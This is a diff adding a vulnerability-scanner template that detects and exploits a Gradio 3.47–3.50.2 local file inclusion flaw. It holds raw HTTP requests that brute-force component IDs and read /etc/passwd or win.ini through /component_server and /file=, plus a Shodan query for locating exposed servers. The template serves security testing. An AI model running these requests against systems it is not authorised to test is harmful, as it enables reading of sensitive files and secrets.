@@ -1,0 +1,67 @@
+id: gradio-lfi
+
+info:
+  name: Gradio 3.47 – 3.50.2 - Local File Inclusion
+  author: nvn1729
+  severity: high
+  description: |
+    Local file read by calling arbitrary methods of Components class between Gradio versions 3.47 – 3.50.2
+  reference:
+    - https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
+    - https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    epss-percentile: 0.36659
+    cpe: cpe:2.3:a:gradio_project:gradio:*:*:*:*:python:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: html:"__gradio_mode__"
+    product: gradio
+    vendor: gradio_project
+  tags: cve,cve2024,intrusive,unauth,gradio,lfi,lfr
+
+http:
+  - raw:
+      - |
+        POST /component_server HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"component_id": "{{fuzz_component_id}}", "data": "{{path}}", "fn_name": "make_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}
+
+      - |
+        GET /file={{download_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        part: body
+        name: download_path
+        internal: true
+        group: 1
+        regex:
+          - "\"?([^\"]+)"
+
+    attack: clusterbomb
+    payloads:
+      fuzz_component_id: helpers/wordlists/numbers.txt
+      path:
+        - /etc/passwd
+        - c:\\windows\\win.ini
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a0048304602210084e268bcbb7b9a35b5c1948daf05600fa5db9d90d22f05b7bca02ff5cab01d02022100fefb18defe00a340bee9bc96ef55485a5f5602e395cca980c18f9c3b7807a707:922c64590222798bb761d5b6d8e72950
